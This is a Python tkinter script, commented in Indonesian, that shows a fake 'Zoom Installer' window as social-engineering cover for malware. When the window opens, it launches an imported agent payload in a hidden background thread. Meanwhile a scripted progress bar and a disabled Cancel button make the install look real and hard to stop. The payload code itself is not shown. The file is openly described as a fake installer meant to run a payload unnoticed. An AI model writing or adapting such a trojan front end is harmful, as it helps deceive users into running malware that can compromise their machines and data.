# installer_gui.py - GUI instalasi palsu yang menjalankan payload di background.

import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time
import agent  # Mengimpor script agent kita

class FakeInstallerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Zoom Installer")
        self.root.geometry("450x200")
        self.root.resizable(False, False)
        
        # Coba atur ikon jendela (membutuhkan file .ico)
        try:
            # Gunakan path ke ikon Zoom Anda
            self.root.iconbitmap(agent.get_resource_path('zoom.ico')) 
        except Exception as e:
            print(f"Warning: Could not set window icon. {e}")

        # Label utama
        self.label = ttk.Label(root, text="Installing Zoom...", font=("Helvetica", 12))
        self.label.pack(pady=20)

        # Progress bar
        self.progress = ttk.Progressbar(root, orient="horizontal", length=400, mode="determinate")
        self.progress.pack(pady=10)

        # Tombol Cancel (dinonaktifkan agar terlihat lebih meyakinkan)
        self.cancel_button = ttk.Button(root, text="Cancel", state="disabled")
        self.cancel_button.pack(pady=10)

        # Mulai proses instalasi "palsu"
        self.start_installation()

    def start_installation(self):
        # 1. Jalankan payload agent di thread terpisah agar GUI tidak macet
        payload_thread = threading.Thread(target=agent.run_payload, daemon=True)
        payload_thread.start()

        # 2. Mulai animasi progress bar
        self.run_progress_bar()

    def run_progress_bar(self):
        """Mensimulasikan proses instalasi dengan menggerakkan progress bar."""
        for i in range(101):
            self.progress['value'] = i
            # Ubah teks untuk memberikan ilusi kemajuan
            if i < 30:
                self.label.config(text="Extracting files...")
            elif i < 70:
                self.label.config(text="Installing components...")
            elif i < 95:
                self.label.config(text="Finalizing installation...")
            else:
                self.label.config(text="Installation successful!")

            self.root.update_idletasks() # Perbarui GUI
            time.sleep(0.05) # Jeda singkat untuk animasi

        # Setelah selesai, tutup jendela setelah 1 detik
        self.root.after(1000, self.root.destroy)

if __name__ == '__main__':
    # Pastikan agent tidak langsung berjalan jika script ini diimpor
    # Kita hanya akan menjalankan GUI-nya
    root = tk.Tk()
    app = FakeInstallerGUI(root)
    root.mainloop()
